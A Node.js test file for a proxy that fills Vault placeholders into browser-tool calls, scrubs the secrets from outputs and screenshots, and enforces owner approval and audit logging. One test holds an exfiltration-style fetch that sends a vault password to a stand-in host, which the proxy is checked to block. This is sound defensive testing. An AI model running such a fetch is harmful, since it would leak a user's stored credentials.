// 1.43 Typed by Pocket: pocket-mcp-proxy fills {{vault:…}} placeholders into a browser tool's arguments from the Vault
// (policy and approvals apply), scrubs the values from everything the tool sends back, and passes ordinary calls through.
// 1.73.5: fills go into fill tools only, pictures are withheld once a value has been typed, keys, numbers, stderr chunks
// and retired values are scrubbed, a malformed daemon answer types nothing, a close waits for a pending fill, and a
// server that ignores a signal is killed.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import readline from 'node:readline';
import {spawn} from 'node:child_process';
import {createHmac,randomUUID} from 'node:crypto';
import {newKey} from '../vault.mjs';
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const repo=path.resolve(import.meta.dirname,'..');
const cleanEnv=()=>Object.fromEntries(Object.entries(process.env).filter(([k])=>!/^(POCKET|VAPID|CODEX)_/.test(k)));
const PASS='Pr0xy-P@ss "quoted" value';

// A test daemon with the Vault on, and proxies in front of the fake browser tool, talking line-delimited JSON-RPC.
async function boot(t,{port=19061}={}){
  const dir=fs.mkdtempSync(path.join(os.tmpdir(),'pocket-proxy-'));
  const secret=randomUUID(),exp=Date.now()+3600000,cookie=exp+'.'+createHmac('sha256',secret).update(String(exp)).digest('hex');
  const headers={'content-type':'application/json',cookie:'pc_auth='+cookie};
  fs.mkdirSync(path.join(dir,'sessions'),{recursive:true});fs.mkdirSync(path.join(dir,'data'),{recursive:true});
  let srv;const state={logs:''};const procs=[];
  const start=async()=>{
   srv=spawn(process.execPath,['server.mjs'],{cwd:repo,env:{...cleanEnv(),PORT:String(port),POCKET_ENV_FILE:'',POCKET_AUTO_TITLES:'0',POCKET_PASSWORD:'test-only',POCKET_SECRET:secret,POCKET_CODEX:'0',POCKET_VOICE:'off',POCKET_MEMSTEM:'0',POCKET_SKILLS:'0',POCKET_SESSION_ROOT:path.join(dir,'sessions'),POCKET_DATA_DIR:path.join(dir,'data'),POCKET_TEST_CALLS:path.join(dir,'calls'),CLAUDE_BIN:path.join(repo,'test/fake-claude.mjs'),POCKET_VAULT_KEY:newKey()},stdio:['ignore','pipe','pipe']});
   srv.stdout.on('data',b=>{state.logs+=b});srv.stderr.on('data',b=>{state.logs+=b});
   for(let i=0;i<100;i++){if(srv.exitCode!==null)break;try{const r=await fetch(`http://127.0.0.1:${port}/api/health`);if(r.ok)return;}catch{} await sleep(30)}
   if(srv.exitCode!==null&&/EADDRINUSE/.test(state.logs)&&(start.tries=(start.tries||0)+1)<4){port+=41;state.logs='';return start();}
   throw Error('Test server failed: '+state.logs);
  };
  t.after(async()=>{for(const p of procs)try{p.kill('SIGKILL')}catch{};if(srv&&srv.exitCode===null){const e=new Promise(r=>srv.once('exit',r));srv.kill();await e;}fs.rmSync(dir,{recursive:true,force:true,maxRetries:5});});
  await start();
  const call=async(p,body)=>{const r=await fetch(`http://127.0.0.1:${port}/api${p}`,{method:body?'POST':'GET',headers,body:body?JSON.stringify(body):undefined});return {status:r.status,body:await r.json().catch(()=>({}))};};
  const mcpLog=path.join(dir,'mcp.log');
  const open=(extra={})=>{
   const p=spawn(process.execPath,[path.join(repo,'scripts/pocket-mcp-proxy.mjs'),'--name','browser','--',process.execPath,path.join(repo,'test/fake-mcp.mjs')],{cwd:dir,env:{...cleanEnv(),PORT:String(port),POCKET_ENV_FILE:'',POCKET_DATA_DIR:path.join(dir,'data'),POCKET_VAULT_FILL_WAIT:'1',FAKE_MCP_LOG:mcpLog,...extra},stdio:['pipe','pipe','pipe']});procs.push(p);
   const waiting=new Map();let stderr='';p.stderr.on('data',b=>{stderr+=b;});
   readline.createInterface({input:p.stdout}).on('line',l=>{const m=JSON.parse(l);waiting.get(m.id)?.(m);});
   let n=0;const rpc=(method,params)=>new Promise(res=>{const id=++n;waiting.set(id,res);p.stdin.write(JSON.stringify({jsonrpc:'2.0',id,method,params})+'\n');});
   return {p,rpc,stderr:()=>stderr};
  };
  const lastTyped=()=>JSON.parse(fs.readFileSync(mcpLog,'utf8').trim().split('\n').at(-1));
  return {dir,port,call,open,state,mcpLog,lastTyped};
}

test('MCP proxy: placeholders are filled from the Vault on the way in, scrubbed on the way out; ask policy, denial, off and pass-through',async t=>{
  const {dir,call,open,state,mcpLog,lastTyped}=await boot(t);
  assert.equal((await call('/settings',{vault:true})).body.vault,true);
  assert.equal((await call('/vault/act',{action:'add',name:'portal',kind:'login',values:{username:'brad@example.test',password:PASS},policy:'auto'})).status,200);
  assert.equal((await call('/vault/act',{action:'add',name:'bank',kind:'login',values:{username:'brad-bank',password:'bank-secret-123'}})).status,200,'follows the default: ask once');
  assert.equal((await call('/vault/act',{action:'add',name:'pin',kind:'token',values:{value:'48213907'},policy:'auto'})).status,200);
  // 1.73.5: the server never inherits the daemon's own secrets, whatever the relay was started with.
  const {rpc,stderr,p}=open({POCKET_VAULT_KEY:newKey(),POCKET_VAULT_KEY_PREVIOUS:newKey(),POCKET_SMTP_URL:'smtp://u:p@mail.example.test',POCKET_SMTP_FROM:'x@example.test',POCKET_ROUTER_KEY:'rk-test',POCKET_PASSWORD:'pw',POCKET_SECRET:'s',VAPID_PRIVATE:'v',POCKET_RUNNER_TOKEN:'keep-me'});
  const init=await rpc('initialize',{protocolVersion:'2025-06-18'});
  assert.equal(init.result.serverInfo.name,'fake','initialize passes through');
  assert.deepEqual(init.result.env,['POCKET_DATA_DIR','POCKET_ENV_FILE','POCKET_RUNNER_TOKEN','POCKET_VAULT_FILL_WAIT'],'the vault keys, login, cookie, push, mail and router secrets are stripped; the runner token stays');
  assert.deepEqual((await rpc('tools/list',{})).result.tools.map(x=>x.name),['type','peek','shot','evaluate']);
  // An ordinary call is untouched, and before any fill a screenshot comes back as it is.
  let r=await rpc('tools/call',{name:'type',arguments:{text:'hello'}});assert.equal(r.result.content[0].text,"await page.getByLabel('Password').fill('hello');");
  r=await rpc('tools/call',{name:'shot',arguments:{}});assert.equal(r.result.content[0].type,'image');assert.equal(typeof r.result.content[1].resource.blob,'string');
  // A placeholder: the tool gets the real value, the answer and later results carry only the placeholder.
  r=await rpc('tools/call',{name:'type',arguments:{text:'{{vault:portal.password}}'}});
  assert.equal(r.result.isError,undefined,JSON.stringify(r.result));
  assert.equal(r.result.content[0].text,"await page.getByLabel('Password').fill('{{vault:portal.password}}');");
  assert.equal(lastTyped().text,PASS,'the browser tool received the real value');
  r=await rpc('tools/call',{name:'peek',arguments:{}});
  assert.equal(r.result.content[0].text,'- textbox "Password": {{vault:portal.password}}','a later snapshot is scrubbed too');assert.equal(r.result.structuredContent.value,'{{vault:portal.password}}');
  assert.deepEqual(r.result.structuredContent.byText,{'{{vault:portal.password}}':true},'1.73.5: an object key spelling the value is scrubbed');
  await sleep(800);assert.equal(stderr().includes(PASS),false,'and the tool\'s stderr, even split across chunks');assert.match(stderr(),/typing \{\{vault:portal\.password\}\}/);
  // 1.73.5: once a value has been typed, pictures are withheld: the page may be showing it.
  r=await rpc('tools/call',{name:'shot',arguments:{}});
  assert.deepEqual(r.result.content.map(c=>c.type),['text','resource','text']);assert.match(r.result.content[0].text,/Removed by Pocket/);
  assert.equal(r.result.content[1].resource.blob,undefined);assert.match(r.result.content[1].resource.text,/Removed by Pocket/);assert.equal(r.result.content[2].text,'Took a screenshot');
  // 1.73.5: a number spelling the value is scrubbed.
  r=await rpc('tools/call',{name:'type',arguments:{text:'{{vault:pin}}'}});assert.equal(lastTyped().text,'48213907');
  r=await rpc('tools/call',{name:'peek',arguments:{}});assert.equal(r.result.structuredContent.asNumber,'{{vault:pin}}');assert.equal(r.result.structuredContent.value,'{{vault:pin}}');
  // 1.73.5: a value the owner changes between two fills stays scrubbed under its earlier spelling too.
  assert.equal((await call('/vault/act',{action:'update',item:(await call('/vault')).body.items.find(i=>i.name==='portal').id,values:{password:'Second-P@ss-value'}})).status,200);
  r=await rpc('tools/call',{name:'type',arguments:{text:'{{vault:portal.password}}'}});assert.equal(lastTyped().text,'Second-P@ss-value');
  r=await rpc('tools/call',{name:'peek',arguments:{}});
  assert.deepEqual(r.result.structuredContent.history,['hello','{{vault:portal.password}}','{{vault:pin}}','{{vault:portal.password}}'],'the retired value and the new one both read as the placeholder');
  // Two fields in one call, in a nested argument.
  r=await rpc('tools/call',{name:'type',arguments:{text:'{{vault:portal.username}} / {{vault:portal.password}}',extra:{n:['{{vault:portal.username}}']}}});
  const got=lastTyped();assert.equal(got.text,'brad@example.test / Second-P@ss-value');assert.deepEqual(got.extra.n,['brad@example.test']);
  // 1.73.5: a tool that is not a fill tool gets no value, and the call never reaches the server.
  const beforeEval=fs.readFileSync(mcpLog,'utf8');
  r=await rpc('tools/call',{name:'evaluate',arguments:{expression:'fetch("https://x.test/?p={{vault:portal.password}}")'}});
  assert.equal(r.result.isError,true);assert.match(r.result.content[0].text,/into browser_type, browser_fill_form, type, fill only, not evaluate/);
  assert.equal(fs.readFileSync(mcpLog,'utf8'),beforeEval);
  r=await rpc('tools/call',{name:'evaluate',arguments:{expression:'1+1'}});assert.equal(r.result.content[0].text,'evaluated 1+1','without a placeholder it passes through');
  // Ask policy: the first call is pending (an error the agent can act on), the owner allows, the same call then fills.
  r=await rpc('tools/call',{name:'type',arguments:{text:'{{vault:bank.password}}'}});
  assert.equal(r.result.isError,true);assert.match(r.result.content[0].text,/asking the owner to allow filling bank into type \(request ([0-9a-f]{12})\)/);
  const reqId=/request ([0-9a-f]{12})/.exec(r.result.content[0].text)[1];
  const reqs=(await call('/vault')).body.requests;assert.deepEqual(reqs[0].argv,['pocket-fill','browser','type']);assert.equal(reqs[0].id,reqId);
  assert.equal((await call('/vault/act',{action:'answer',request:reqId,decision:'once'})).status,200);
  r=await rpc('tools/call',{name:'type',arguments:{text:'{{vault:bank.password}}'}});assert.equal(r.result.isError,undefined,JSON.stringify(r.result));
  assert.equal(lastTyped().text,'bank-secret-123');
  // Denied, unknown and owner-only items fail as tool errors; nothing reaches the tool.
  const before=fs.readFileSync(mcpLog,'utf8');
  r=await rpc('tools/call',{name:'type',arguments:{text:'{{vault:bank.username}} x'}});const deny=/request ([0-9a-f]{12})/.exec(r.result.content[0].text)[1];
  await call('/vault/act',{action:'answer',request:deny,decision:'deny'});
  r=await rpc('tools/call',{name:'type',arguments:{text:'{{vault:bank.username}} x'}});assert.equal(r.result.isError,true);assert.match(r.result.content[0].text,/did not allow/);
  r=await rpc('tools/call',{name:'type',arguments:{text:'{{vault:nope.password}}'}});assert.equal(r.result.isError,true);assert.match(r.result.content[0].text,/no item named nope/);
  await call('/vault/act',{action:'update',item:(await call('/vault')).body.items.find(i=>i.name==='bank').id,policy:'owner'});
  r=await rpc('tools/call',{name:'type',arguments:{text:'{{vault:bank.password}}'}});assert.equal(r.result.isError,true);assert.match(r.result.content[0].text,/owner only/);
  assert.equal(fs.readFileSync(mcpLog,'utf8'),before,'none of those reached the tool');
  // The audit records fills, never values.
  const audit=fs.readFileSync(path.join(dir,'data','vault-audit.jsonl'),'utf8');assert.match(audit,/"action":"fill"/);
  for(const v of [PASS,'bank-secret-123','brad@example.test','Second-P@ss-value','48213907'])assert.equal(audit.includes(v),false);
  assert.match(state.logs,/vault fill tool=type items=portal by terminal/);assert.equal(state.logs.includes(PASS),false);
  // 1.73.5: POCKET_VAULT_FILL_TOOLS names the fill tools for another server.
  const other=open({POCKET_VAULT_FILL_TOOLS:'evaluate, fill'});
  r=await other.rpc('tools/call',{name:'evaluate',arguments:{expression:'{{vault:pin}}'}});assert.equal(r.result.content[0].text,'evaluated {{vault:pin}}');assert.equal(lastTyped().expression,'48213907');
  r=await other.rpc('tools/call',{name:'type',arguments:{text:'{{vault:pin}}'}});assert.equal(r.result.isError,true);assert.match(r.result.content[0].text,/into evaluate, fill only, not type/);
  // With the Vault off, placeholder calls fail clearly and ordinary calls still work.
  assert.equal((await call('/settings',{vault:false})).body.vault,false);
  r=await rpc('tools/call',{name:'type',arguments:{text:'{{vault:portal.password}}'}});assert.equal(r.result.isError,true);assert.match(r.result.content[0].text,/The Vault is off/);
  r=await rpc('tools/call',{name:'type',arguments:{text:'plain'}});assert.match(r.result.content[0].text,/fill\('plain'\)/);
  // The proxy exits with its server.
  const exited=new Promise(res=>p.once('exit',res));p.stdin.end();assert.equal(await exited,0);
});

test('MCP proxy (1.73.5): a client that closes while a fill waits still gets its answer; a server that ignores SIGTERM is killed',async t=>{
  const {call,open}=await boot(t,{port:19181});
  assert.equal((await call('/settings',{vault:true})).body.vault,true);
  assert.equal((await call('/vault/act',{action:'add',name:'bank',kind:'login',values:{username:'brad-bank',password:'bank-secret-123'}})).status,200,'ask once');
  // The fill waits POCKET_VAULT_FILL_WAIT (1 s) for the owner; the client closes at once. The answer still comes, then the proxy ends.
  const {rpc,p}=open();
  const exited=new Promise(res=>p.once('exit',res));
  const pending=rpc('tools/call',{name:'type',arguments:{text:'{{vault:bank.password}}'}});
  p.stdin.end();
  const r=await Promise.race([pending,sleep(8000).then(()=>null)]);
  assert.ok(r,'the call was answered after the client closed');assert.match(r.result.content[0].text,/asking the owner to allow filling bank/);
  assert.equal(await exited,0);
  // A signal is passed to the server; one it ignores is followed by SIGKILL after five seconds.
  const stubborn=open({FAKE_MCP_STUBBORN:'1'});
  assert.equal((await stubborn.rpc('initialize',{protocolVersion:'2025-06-18'})).result.serverInfo.name,'fake');
  const gone=new Promise(res=>stubborn.p.once('exit',(code,sig)=>res({code,sig})));
  const t0=Date.now();stubborn.p.kill('SIGTERM');
  const end=await Promise.race([gone,sleep(9000).then(()=>null)]);
  assert.ok(end,'the proxy ended although its server ignored SIGTERM');assert.ok(Date.now()-t0>=4500&&Date.now()-t0<9000,'after the five-second grace');
});

test('MCP proxy (1.73.5): a daemon answer that is not one string per placeholder types nothing',async t=>{
  // A stand-in for the daemon that answers ok with the wrong shapes.
  const dir=fs.mkdtempSync(path.join(os.tmpdir(),'pocket-proxy-shape-'));fs.mkdirSync(path.join(dir,'data'));fs.writeFileSync(path.join(dir,'data','cli-token'),'t');
  const answers=[{ok:true,values:'bank-secret-123'},{ok:true,values:['bank-secret-123']},{ok:true,values:{'bank.password':123}},{ok:true,values:{'bank.password':'bank-secret-123',other:'x'}},{ok:true,values:{'bank.password':'bank-secret-123'}}];
  let n=0;const fake=http.createServer((req,res)=>{let b='';req.on('data',c=>b+=c);req.on('end',()=>{res.setHeader('content-type','application/json');res.end(JSON.stringify(answers[n++]));});});
  await new Promise(r=>fake.listen(0,'127.0.0.1',r));
  const mcpLog=path.join(dir,'mcp.log');
  const p=spawn(process.execPath,[path.join(repo,'scripts/pocket-mcp-proxy.mjs'),'--name','browser','--',process.execPath,path.join(repo,'test/fake-mcp.mjs')],{cwd:dir,env:{...cleanEnv(),POCKET_ENV_FILE:'',POCKET_DATA_DIR:path.join(dir,'data'),POCKET_URL:`http://127.0.0.1:${fake.address().port}`,POCKET_VAULT_FILL_WAIT:'1',FAKE_MCP_LOG:mcpLog},stdio:['pipe','pipe','pipe']});
  t.after(()=>{try{p.kill('SIGKILL')}catch{};fake.close();fs.rmSync(dir,{recursive:true,force:true});});
  const waiting=new Map();let stderr='';p.stderr.on('data',b=>{stderr+=b;});
  readline.createInterface({input:p.stdout}).on('line',l=>{const m=JSON.parse(l);waiting.get(m.id)?.(m);});
  let id=0;const rpc=(method,params)=>new Promise(res=>{const k=++id;waiting.set(k,res);p.stdin.write(JSON.stringify({jsonrpc:'2.0',id:k,method,params})+'\n');});
  for(let i=0;i<4;i++){const r=await rpc('tools/call',{name:'type',arguments:{text:'{{vault:bank.password}}'}});assert.equal(r.result.isError,true,JSON.stringify(r.result));assert.match(r.result.content[0].text,/form the relay does not understand; nothing was typed/);}
  assert.equal(fs.existsSync(mcpLog),false,'none of those reached the tool');
  assert.equal(stderr.includes('bank-secret-123'),false);assert.match(stderr,/did not carry one value per placeholder/);
  const r=await rpc('tools/call',{name:'type',arguments:{text:'{{vault:bank.password}}'}});assert.equal(r.result.isError,undefined,'the proxy is still running, and a well-formed answer fills');
  assert.equal(JSON.parse(fs.readFileSync(mcpLog,'utf8').trim()).text,'bank-secret-123');
});
